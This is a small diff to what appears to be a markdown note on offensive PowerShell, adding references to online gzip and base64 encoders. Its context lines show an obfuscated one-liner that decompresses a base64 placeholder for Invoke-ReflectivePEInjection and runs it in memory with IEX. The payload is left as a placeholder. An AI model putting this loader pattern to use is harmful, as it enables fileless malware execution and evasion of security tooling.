@@ -77,3 +77,7 @@ Write-host "$out" -foregroundcolor yellow -nonewline; Write-host ".";
 $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String('insert_gzip_compressed_Invoke-ReflectivePEInjection'));
 IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()
 ```
+
+# References
+- https://www.multiutil.com/text-to-gzip-compress/
+- https://www.base64encode.org/
